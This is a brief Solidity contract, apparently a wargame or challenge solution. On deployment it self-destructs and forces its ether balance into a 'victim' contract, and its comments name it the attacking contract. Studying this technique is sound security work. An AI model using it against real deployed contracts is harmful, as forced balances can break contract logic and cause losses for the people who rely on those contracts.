pragma solidity ^0.4.23;


// deploy with some wei; balance is transfered to _victim contract and
// the attacking contract selfdestructs
contract levelZero {

     constructor(address _victim) public payable {
         selfdestruct(_victim);
     }
 }
